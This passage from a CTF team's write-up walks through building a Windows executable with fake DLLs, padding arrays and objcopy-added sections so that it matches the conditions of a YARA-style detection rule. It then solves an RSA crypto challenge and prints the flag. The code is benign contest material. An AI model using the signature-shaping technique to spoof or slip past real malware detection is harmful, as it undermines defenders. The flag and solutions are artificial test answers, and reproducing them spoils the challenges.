<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;vector&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdlib&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctime&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllimport) <span style="color:#66d9ef">void</span> Function1();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllimport) <span style="color:#66d9ef">void</span> Function2();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllimport) <span style="color:#66d9ef">void</span> Function3();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllimport) <span style="color:#66d9ef">void</span> Function4();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllimport) <span style="color:#66d9ef">void</span> Function5();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllimport) <span style="color:#66d9ef">void</span> Function6();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllimport) <span style="color:#66d9ef">void</span> Function7();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> randomData[<span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0x2C</span>, <span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xD0</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">…</span>
</span></span><span style="display:flex;"><span>   (REDACTED)
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">…</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0xE6</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0xE9</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x12</span>,
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> randomData2[<span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0x8C</span>, <span style="color:#ae81ff">0xD5</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xD5</span>,
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">…</span>
</span></span><span style="display:flex;"><span>   (REDACTED)
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">…</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xF1</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x88</span>,
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span> pattern <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xC3</span>
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Function1();
</span></span><span style="display:flex;"><span>    Function2();
</span></span><span style="display:flex;"><span>    Function3();
</span></span><span style="display:flex;"><span>    Function4();
</span></span><span style="display:flex;"><span>    Function5();
</span></span><span style="display:flex;"><span>    Function6();
</span></span><span style="display:flex;"><span>    Function7();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><!-- raw HTML omitted -->
<p>This is the code which imports exactly 62 functions, with 3 of it being from acs.dll. Then, there are large arrays of random data to pass the entropy check.</p>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> VERSIONINFO
</span></span><span style="display:flex;"><span>FILEVERSION <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>PRODUCTVERSION <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>FILEFLAGSMASK <span style="color:#ae81ff">0x3F</span>
</span></span><span style="display:flex;"><span>FILEFLAGS <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>FILEOS VOS__WINDOWS32
</span></span><span style="display:flex;"><span>FILETYPE VFT_APP
</span></span><span style="display:flex;"><span>FILESUBTYPE <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BEGIN
</span></span><span style="display:flex;"><span>    BLOCK <span style="color:#e6db74">&#34;StringFileInfo&#34;</span>
</span></span><span style="display:flex;"><span>    BEGIN
</span></span><span style="display:flex;"><span>        BLOCK <span style="color:#e6db74">&#34;040904E4&#34;</span> <span style="color:#75715e">// Language and codepage (US English, Unicode)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        BEGIN
</span></span><span style="display:flex;"><span>            VALUE <span style="color:#e6db74">&#34;CompanyName&#34;</span>, <span style="color:#e6db74">&#34;acs&#34;</span>
</span></span><span style="display:flex;"><span>        END
</span></span><span style="display:flex;"><span>    END
</span></span><span style="display:flex;"><span>    BLOCK <span style="color:#e6db74">&#34;VarFileInfo&#34;</span>
</span></span><span style="display:flex;"><span>    BEGIN
</span></span><span style="display:flex;"><span>        VALUE <span style="color:#e6db74">&#34;Translation&#34;</span>, <span style="color:#ae81ff">0x0409</span>, <span style="color:#ae81ff">1252</span>
</span></span><span style="display:flex;"><span>    END
</span></span><span style="display:flex;"><span>END
</span></span></code></pre></div><!-- raw HTML omitted -->
<p>Version.rc is to be compiled with the cpp file to match <code>pe.version_info[&quot;CompanyName&quot;] == &quot;acs&quot;</code></p>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> Function1();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> Function2();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> Function3();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Function1</span>() {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Function1 from acs.dll called!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Function2</span>() {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Function2 from acs.dll called!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Function3</span>() {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Function3 from acs.dll called!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> Function4();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> Function5();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> Function6();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> Function7();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Function4</span>() {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Function4 from acs.dll called!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Function5</span>() {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Function5 from acs.dll called!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Function6</span>() {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Function6 from acs.dll called!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Function7</span>() {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Function7 from acs.dll called!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><!-- raw HTML omitted -->
<p>A fake dll to match the number of function imports</p>
<p>The code above will pass most of the rules already, the hardest part was adding a section that matches the standard deviation range of 61.8 - 61.9. After a lot of trial and testing, we made a binary file with random data inside, manually modifying bytes until we achieve the desired standard deviation. We also have to match the condition ($acs = { 90 90 90 90 68 ?? ?? ?? ?? C3 }) where $acs must be located at an offset of +0x2f. We can run these commands to add the section to the exe.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>objcopy --add-section .mysection<span style="color:#f92672">=</span>data.txt test.exe test.exe
</span></span><span style="display:flex;"><span>objcopy --add-section .mysection2<span style="color:#f92672">=</span>data.txt test.exe test.exe 
</span></span><span style="display:flex;"><span>objcopy --add-section .acs<span style="color:#f92672">=</span>acssection.bin test.exe test.exe
</span></span></code></pre></div><h3 id="acssectionbin">Acssection.bin<a hidden class="anchor" aria-hidden="true" href="#acssectionbin">#</a></h3>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/2610fc2c-1521-42c8-9b88-ed54b8fb6910"></p>
<p>One last step before we match everything, when we compile with the version.res which will make the number of resources into 2. We will use CFF Explorer to just delete the resource</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/f0318f82-030c-45e8-95e8-e78deab7065d"></p>
<p>Then, just upload the file.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/83ce001f-827a-48e3-a46a-321e1353d5cc"></p>
<blockquote>
<p>Flag : ACS{97d9bad8791993f95050bf4668f3e1351f39b21fafeb986822915ecc71d75f77}</p>
</blockquote>
<h1 id="cryptosecret-encrypt">Crypto/Secret Encrypt<a hidden class="anchor" aria-hidden="true" href="#cryptosecret-encrypt">#</a></h1>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/43b28ad0-f7e1-4682-8ff3-3ad67ec2c97d"></p>
<p>After analyzing the secret function for a while, we can see that the number of iterations does not change because it uses the same secret3. Since secret1 is also a global variable, it will be updated every time we run this function.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/aa4fbd6a-56f9-4082-b3a9-bbb2dd8b52d0"></p>
<p>This is the equations that we can derive from the script above. We know that k is the fixed number of iterations that we have to find. We know that k multiplied with output 1 we can get output 2 and same goes for output 3.</p>
<p><img alt="image" loading="lazy" src="https://github.com/user-attachments/assets/91770315-977b-47d8-8fa5-df71715afb86"></p>
<p>Then we will use simultaneous equation to solve for k and remove S4. Then we can factorize both equations. From the first equation there are 2 unknowns so we cannot solve that but the second equation, we have everything we need to solve for k. After getting the value for k, we can solve for S1 and get the p_rsa and we can RSA decrypt for the flag.</p>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>secret_out<span style="color:#f92672">=</span>[<span style="color:#ae81ff">2300421886456816351333038657690265151708360443867130686953248448630531093021776734868674112240095418467093081756335930515843525383128738534202096348377560386173570623441341520395024918493491724749213178102009151013218735777147941242873009226181626903461558777748363070242458097134402254164979416319966395006</span>, <span style="color:#ae81ff">118964893465008760906148513803880740427426131597706706568706005798920125121985562712819885692864935956027782962836691988567169040365350150416055346960755633472875717465898683139277419122088292007600766276511481224635277838009319684482964767210192366303533764466354302709679013042872343430366540326193987064645</span>, <span style="color:#ae81ff">90822909054820019495848981290779830597424633150254073315406974106438388320012099062499510476986746519431915469091680034456400733513195561250293814032158684572016278396810686958474205299987143330650890060883372170577823300904023529858782819407737240576117609136514644966087947730563905446620136904194643698198</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n<span style="color:#f92672">=</span><span style="color:#ae81ff">20009817089569599969538500034726137113860180378444144520680720380692155921700313466801113645321964859714346152831289324522691712373980295752612143787805513744596845142947565574859214431250136840018060927071875139532338460212335213420284901918516101557291315678272762415979902727124588156079493807073200546288791822792848832017274870268954552045671250363562973791606622534055827461929215079320844719649763363790174187688772315493266741429035524622360771778144037322337653884113230944318554468904277796127275077196154359393948582189156560613101425299832337719592901727785865373121552005054050809254799001160651919041273</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>enc<span style="color:#f92672">=</span> <span style="color:#ae81ff">17344290788163015442564038139247334246060642996020446850904852322039560290118766056392172895820951735374997354582709325518744702347901024840385769459937997819017954914367135733032234042160950809727187366403932100980467655542279928058464435224759900315683519706073455878465191841286965255617968372213737731942678587359354085082039577400390336690085883027339539322625462749425424798876860559141668103407199665082352825962061580373066150843935421008052782270096495723400071390700979281961303531001562910399929551753423625553318250211321347445434080128164118499925998330651792925936876711132409460643630484260433317617505</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">1024</span>
</span></span><span style="display:flex;"><span>out21 <span style="color:#f92672">=</span> (secret_out[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> secret_out[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">%</span>s2
</span></span><span style="display:flex;"><span>out10 <span style="color:#f92672">=</span> (secret_out[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> secret_out[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">%</span>s2
</span></span><span style="display:flex;"><span>k <span style="color:#f92672">=</span> (out21<span style="color:#f92672">*</span>pow(out10,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,s2))<span style="color:#f92672">%</span>s2 <span style="color:#75715e"># k should be same for all iteration since s3 never changed</span>
</span></span><span style="display:flex;"><span>out0p <span style="color:#f92672">=</span> (out10 <span style="color:#f92672">*</span> pow(k,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,s2))<span style="color:#f92672">%</span>s2
</span></span><span style="display:flex;"><span>s1 <span style="color:#f92672">=</span> (secret_out[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> out0p)<span style="color:#f92672">%</span>s2
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> s1
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> n<span style="color:#f92672">//</span>p
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">p = 132790300101366058515958319162299029496405124107273636270906558644633499211040666269535156087138615191931144220498705500614664040267695307905904116245626464026778297953182366717423923687292230514699937937252522698285265470300659804575877503151767844550730621058684052444790791025203953209758824961680910607517
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">q = 150687339920875382113791022506874143187279559347292591253769866286725301123955523995561688927048985382258572221281989736370068559920886474787642952585643202043783643860132711115711465813075539209137582922811552548124014088150222590245888319427478214922187640615079569173552234835682647189213206202677621977869
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> p<span style="color:#f92672">*</span>q <span style="color:#f92672">==</span> n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> pow(<span style="color:#ae81ff">65537</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,phi)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(long_to_bytes(pow(enc,d,n)))
</span></span></code></pre></div><!-- raw HTML omitted -->
<h1 id="moments-">Moments !!!<a hidden class="anchor" aria-hidden="true" href="#moments-">#</a></h1>
<p><img alt="On The Way!" loading="lazy" src="/images/acs24tehtarikcendol/ondaway.png">
<img alt="First Day!" loading="lazy" src="/images/acs24tehtarikcendol/firstday.png">
<img alt="Teh Tarik Cendol Team" loading="lazy" src="/images/acs24tehtarikcendol/tehtarikcendol.png">
<img alt="Malaysia Team" loading="lazy" src="/images/acs24tehtarikcendol/malaysiateam.png"></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/acs24/">ACS24</a></li>
      <li><a href="http://localhost:1313/tags/pwn/">PWN</a></li>
      <li><a href="http://localhost:1313/tags/rev/">Rev</a></li>
      <li><a href="http://localhost:1313/tags/misc/">Misc</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/posts/asean-notes-iso-stately-taurus/">
    <span class="title">« Prev</span>
    <br>
    <span>ASEAN Notes.iso Stately Taurus [Malware Analysis]</span>
  </a>
  <a class="next" href="http://localhost:1313/posts/bubar-parlimen/">
    <span class="title">Next »</span>
    <br>
    <span>Bubar Parlimen [Malware Analysis]</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ACS24 Vietnam Team Teh Tarik Cendol Writeup on x"
            href="https://x.com/intent/tweet/?text=ACS24%20Vietnam%20Team%20Teh%20Tarik%20Cendol%20Writeup&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2facs24-team-writeup%2f&amp;hashtags=ACS24%2cPWN%2cRev%2cMisc%2cWeb">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ACS24 Vietnam Team Teh Tarik Cendol Writeup on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2facs24-team-writeup%2f&amp;title=ACS24%20Vietnam%20Team%20Teh%20Tarik%20Cendol%20Writeup&amp;summary=ACS24%20Vietnam%20Team%20Teh%20Tarik%20Cendol%20Writeup&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2facs24-team-writeup%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ACS24 Vietnam Team Teh Tarik Cendol Writeup on reddit"
            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2facs24-team-writeup%2f&title=ACS24%20Vietnam%20Team%20Teh%20Tarik%20Cendol%20Writeup">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 